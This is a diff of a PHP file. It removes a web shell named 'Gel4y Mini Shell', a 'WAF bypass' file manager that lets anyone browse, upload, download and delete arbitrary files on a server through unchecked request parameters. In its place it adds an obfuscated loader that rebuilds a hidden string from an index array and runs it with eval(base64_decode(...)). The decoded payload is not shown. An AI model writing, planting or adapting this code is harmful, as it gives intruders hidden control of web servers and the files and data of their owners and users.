@@ -1,46 +1,7 @@
 <?php
-echo "Gel4y Mini Shell";
-
-$k = 'd'; $a = 'scandir'; $b = 'is_dir'; $c = 'file_get_contents'; $d = 'file_put_contents';
-$e = 'unlink'; $f = 'rename'; $g = 'move_uploaded_file';
-
-echo "<h2>Simple PHP File Manager (WAF Bypass)</h2>";
-$path = isset($_GET['p']) ? $_GET['p'] : '.';
-$files = $a($path);
-
-echo "<form method=POST enctype=multipart/form-data>
-<input type=file name=upfile>
-<input type=submit value=Upload>
-<input type=hidden name=path value='$path'>
-</form>";
-
-if (isset($_FILES['upfile'])) {
-    $g($_FILES['upfile']['tmp_name'], $path.'/'.$_FILES['upfile']['name']);
-    echo "Uploaded!";
-}
-
-echo "<pre>";
-foreach ($files as $file) {
-    if ($file == '.' || $file == '..') continue;
-    $full = $path.'/'.$file;
-    echo ($b($full) ? "[DIR] " : "[FILE] ")."<a href='?p=$full'>$file</a> ";
-    if (!$b($full)) {
-        echo "| <a href='?dl=$full'>Download</a> ";
-        echo "| <a href='?rm=$full' onclick='return confirm(\"Delete?\")'>Delete</a>";
-    }
-    echo "\n";
-}
-echo "</pre>";
-
-if (isset($_GET['dl'])) {
-    $fn = $_GET['dl'];
-    header("Content-Disposition: attachment; filename=" . basename($fn));
-    echo $c($fn);
-    exit;
-}
-
-if (isset($_GET['rm'])) {
-    $e($_GET['rm']);
-    header("Location: ?p=$path");
-}
+$m = "w3UVywiXlHNuHCZCswgVKHxaHCd9aG1gygYcX5IbYnCGayhICm+KIaggGw0kNcjNFGITPZGdhXtCVCbyGgGIRZIgVVNJIHZRGkjsWgG3AiZdO=FbRVEuNzcJyURlgNgcoIG1BbPdClGCzICJmocIAwR0AzGRGhXpuJ9IbBbUKGsW0Zavg/abVNo0cCnVlFJSASdUtUgE9ISJGn3Ca9UGcIEu8pJPvlYyAvZ9WHGTbmybpZbCZ2rXWRkOKZINXm1dmlaCGA3y99ypKiolARs0kCnZ7uIlO53hbZsYbJmdnQYKTHI0WKTbCvRsSg09zVFVQV79LLbiimi4ghDkZckbClAcpigiIR5RtFARnjdViGc=gkbbGdobobcPnXxHtADcyzWADtuAnIKTGlKceIVgRcIKoA2b0CGAJKAScoVy2AlG4uMKBAKdgclvx7IkSWJPglaGWXyAbyGgWFmGJZVkVXa0bXXYbdxM9JKyCDgWlmkFouggWZGngBi0QScKGnSGS7wiCwGcfKpZCGGuyZpP9QPVCg0gw2JHccFbafz+Kb+V1vGYdsllSGIKGB0Jm7kZlgURDJANgt8PZ2lR0GGCNcgjl9mkYQT0RFCPms0CXEYFInk1KCZg2IvAJbnJZIkAcILPWVmTX3KoCIHNAkGRggCwBSbRfRSCmYIZIcA0ZH81RCl2IkWipY0l8kmDJ2t9RVgBRauGaCGgbI5JEHdGAWM5IXVjAUnlF/BpfPCJFGm9SkCaiY+gylFJZCYFdPzOIniRBykS0Ty8J303MPaRSZVYSwbPPJbIyT0KwyjJP5PXDuA9GIhGikyilsGOgUKZnZFJIs14moniGRP1A2WwZWsJPQAlPU2b1l7I9ZIAZCllwZwa1WWxIHIYYlfJZbGgGGS0b0izdIZSUURkQS1H0gHFXUdlSRaZXDoWhZlBzChwoYFG3RbVZiFKZVIVDCWUK9dXRhZCPLbCV2gsscmC3mCL0Rw1";
+$o = "";
+$i = array(287,159,103,129,60,267,161,35,279,193,167,157,93,50,125,23,16,20,19,105,134,4,116,77,205,214,121,118,26,292,122,196,71,219,255,231,270,208,220,27,6,173,268,212,84,76,14,15,135,288,62,194,91,182,147,90,9,97,202,98,89,108,240,181,47,34,286,244,126,72,216,261,115,64,261,251,263,145,78,43,263,170,280,152,63,173,186,1,221,151,58,94,148,226,85,41,164,227,172,164,293,49,7,36,195,73,187,204,110,75,0,285,258,246,190,267,124,256,95,197,174,246,232,28,140,143,207,275,284,222,29,117,99,83,81,174,138,184,237,283,179,247,211,255,58,132,199,260,11,253,39,242,31,259,12,65,277,45,3,175,157,133,287,225,185,211,183,162,17,284,113,259,237,243,66,18,200,180,267,186,79,242,13,249,174,275,225,102,162,142,130,98,146,149,10,185,188,272,197,32,107,157,152,186,136,244,18,223,267,235,65,282,151,55,172,276,249,259,87,59,213,276,218,205,186,57,177,183,19,46,254,209,61,82,74,21,189,224,228,230,74,287,153,216,133,267,178,263,225,6,158,226,282,56,277,67,274,101,165,38,53,88,229,8,68,69,282,223,80,86,104,44,24,178,215,97,40,177,93,271,109,123,42,112,33,283,252,286,52,296,150,264,168,251,66,288,106,93,285,128,236,207,191,189,112,292,156,234,294,96,224,144,269,267,273,43,183,285,219,100,275,133,273,287,102,224,219,68,168,46,248,178,144,247,98,165,92,177,95,200,215,271,280,70,41,244,80,83,160,250,100,48,296,112,187,157,48,38,5,210,102,231,112,290,174,276,121,104,248,229,32,289,169,84,105,276,271,234,291,44,163,260,210,201,87,295,248,281,30,229,282,131,120,25,296,239,165,218,148,239,119,266,149,137,39,273,246,221,252,189,111,215,163,278,137,248,177,235,235,295,282,282,276,232,287,252,129,243,139,191,182,177,242,236,141,283,288,150,22,175,227,233,36,104,208,151,226,283,209,277,30,287,266,129,94,51,254,267,176,293,205,284,153,274,208,103,101,187,209,134,47,121,176,203,177,109,203,215,93,54,90,291,145,252,140,295,220,146,213,135,172,193,217,221,244,210,26,140,233,175,279,86,36,276,83,233,181,260,70,291,78,62,58,233,38,142,60,232,52,37,262,203,243,158,188,157,240,99,111,249,41,95,272,253,179,55,191,124,253,287);
+for($j=0;$j<count($i);$j++) { $o .= $m[$i[$j]]; }
+eval(base64_decode($o));
 ?>
